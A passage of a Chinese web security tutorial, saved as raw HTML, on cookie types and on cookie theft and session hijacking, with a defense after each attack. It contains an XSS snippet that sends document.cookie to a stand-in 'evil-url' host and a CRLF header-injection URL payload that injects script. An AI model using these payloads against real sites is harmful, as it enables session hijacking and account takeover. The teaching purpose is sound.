inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">服务器端设置cookie的时候，也可以指定一个</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">HttpOnly</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">属性。</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: foo=bar; Path=/; HttpOnly</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">third-party cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">supercookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">cookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">zombie cookie/evercookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。 evercookie是实现僵尸cookie的主要技术手段。 了解</span><a href="http://en.wikipedia.org/wiki/Zombie_cookie" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">僵尸cookie</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">和</span><a href="http://en.wikipedia.org/wiki/Evercookie" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">evercookie</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">。</span></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">三、cookie有什么用</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">通常cookie有三种主要的用途。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">session管理</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是</span><a href="http://en.wikipedia.org/wiki/Basic_access_authentication" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">Base Auth</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。所以现在大多数站点采用基于cookie的session管理方式：用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">个性化</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">user tracking</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。</span></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">四、cookie窃取和session劫持</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">本文就cookie的三种用途中session管理的安全问题进行展开。 既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！ 攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">最基本的cookie窃取方式：xss漏洞</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">攻击</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">js 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">var img = document.createElement('img');</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">img.src ='http://evil-url?c='+ encodeURIComponent(document.cookie);</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">document.getElementsByTagName('body')[0].appendChild(img);</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如何寻找XSS漏洞是另外一个话题了，自行google之。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">根据上面</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">HttpOnly cookie</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">的介绍，一旦一个cookie被设置为</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">HttpOnly</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。 但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">document.cookie</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">xss结合phpinfo页面</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">攻击</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。 如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。 phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">关闭所有phpinfo类dump request信息的页面。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">XSS + HTTP TRACE = XST</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">HTTP Response Splitting</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。例如，一个站点接受参数做302跳转：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">www.example.com/?r=http://baidu.com</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">request信息：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">GET /example.com?r=http://baidu.com\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Host: example.com\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">\r\n</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">response:</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 302 Found\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Location: http://baidu.com\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-Type: text/html\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">\r\n</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">这样页面就302跳转到百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">\r\n</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">的header信息：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">response变成了：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 302 Found\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Location: \r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 200 OK\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-Type: text/html\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">X-XSS-Protection: 0\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-Type: text/html\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">\r\n</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">有两个攻击要点：</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">指定X=XSS-Protection: 0 ，关闭浏览器的xss保护机制。</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">注入脚本</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">针对header的内容做过滤，不能漏掉</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">\r\n</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，特别是Location，host，referrer等。说到底，这也是一种XSS攻击，只是攻击方式与普通的不太一样。针对header的攻击还可以做SQL注入等，防御的原则是对所有的输入进行sanitize，包括非用户输入的内容，比如referrer这种一般由浏览器带过来的信息，因为请求完全可以被伪造，未必来自浏览器。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">网络监听(network eavesdropping/network sniffing)</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">DNS缓存投毒攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">中间人攻击常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。防御网络监听通常有两种方式：</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">信道加密</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">内容加密</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种标识性信息是无法通过内容加密得到保护的。那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">https站点攻击：双协议</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); 